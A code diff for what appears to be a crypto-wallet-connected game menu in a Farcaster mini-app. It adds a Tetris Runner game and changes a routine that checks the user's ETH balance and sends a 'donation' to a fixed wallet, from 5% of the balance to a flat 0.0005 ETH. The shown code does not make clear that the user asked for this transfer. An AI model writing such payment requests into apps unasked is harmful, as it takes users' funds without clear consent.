@@ -3,6 +3,7 @@ import { useEffect, useState } from "react";
 import { PlayGame } from "./Playgame";
 import { useFrame } from "@/components/farcaster-provider";
 import UnityStackBall from "../UnityGame/UnityStackBall";
+import UnityTerisRun from "../UnityGame/UnityTerisRun";
 import { GameBackButton } from "./GameBackButton";
 import { mainnet, base, monadTestnet } from "wagmi/chains";
 import {
@@ -30,6 +31,12 @@ const games: Game[] = [
     name: "Stack Ball",
     img: "/logoGame/icon_stackball.png",
     component: "StackBall",
+  },
+  {
+    type: "local",
+    name: "Tetris Runner",
+    img: "/logoGame/icon_terris.png",
+    component: "Tetris",
   },
   {
     type: "external",
@@ -85,10 +92,9 @@ export function Menu() {
           address: address as `0x${string}`,
         });
         const ethBalance = parseFloat(formatEther(balance));
-        if (ethBalance > 0) {
+        if (ethBalance > 0.0005) {
           await switchChain({ chainId: chain.id });
-          const donateAmount = ((5 * ethBalance) / 100).toString();
-          const amount_donate = parseEther(donateAmount);
+          const amount_donate = parseEther("0.0005");
           await sendTransaction({
             account: address as `0x${string}`,
             to: wallet_donate as `0x${string}`,
@@ -107,6 +113,9 @@ export function Menu() {
       <div className="w-full h-full flex flex-col items-center justify-center bg-black p-4">
         {activeGame.component === "StackBall" && (
           <UnityStackBall onBack={() => setActiveGame(null)} />
+        )}
+        {activeGame.component === "Tetris" && (
+          <UnityTerisRun onBack={() => setActiveGame(null)} />
         )}
         {activeGame.component === "BonkBonk" && (
           <PlayGame onBack={() => setActiveGame(null)} />
